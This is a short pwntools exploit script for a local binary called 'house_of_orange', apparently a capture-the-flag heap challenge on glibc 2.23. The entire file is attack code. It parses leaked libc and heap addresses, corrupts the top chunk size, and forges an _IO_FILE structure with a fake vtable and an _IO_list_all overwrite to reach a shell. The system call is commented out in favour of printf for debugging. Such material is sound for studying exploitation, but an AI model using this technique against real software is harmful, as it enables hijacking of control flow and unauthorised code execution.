from pwn import *
p=process('./house_of_orange')
elf=ELF('./house_of_orange')
libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
one_gadget=0x4527a
p.recvuntil(b'0x')
puts_addr=int(p.recv(12),16)
print('puts',hex(puts_addr))
libc_base=puts_addr-libc.symbols['puts']
print('libc_base',hex(libc_base))
p.recvuntil(b'0x')
heap_addr=int(p.recv(12),16)
print('heap',hex(heap_addr))
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b': ',b'a'*0x10+p64(0)+p64(0xfe1))
p.sendlineafter(b'> ',b'2')
print('libc.sym._IO_list_all',hex(libc_base+libc.sym._IO_list_all))
p.sendlineafter(b'> ',b'3')
fake_io_file=b'a'*0x10+b'/bin/sh\x00'+p64(0x61)+p64(0)+p64(libc_base+libc.sym._IO_list_all - 0x10)
fake_io_file+=p64(1)#write_base
fake_io_file+=p64(2)#write_ptr
fake_io_file+=p64(0)*18
# fake_io_file+=p32(0)+p32(0)+p64(0)+p64(libc_base+libc.sym.system)
fake_io_file+=p32(0)+p32(0)+p64(0)+p64(libc_base+libc.sym.printf)
fake_io_file+=p64(heap_addr+0xd8)#vtable


p.sendafter(b': ',fake_io_file)

gdb.attach(p,'b malloc')
p.sendlineafter(b'> ',b'1')

p.interactive()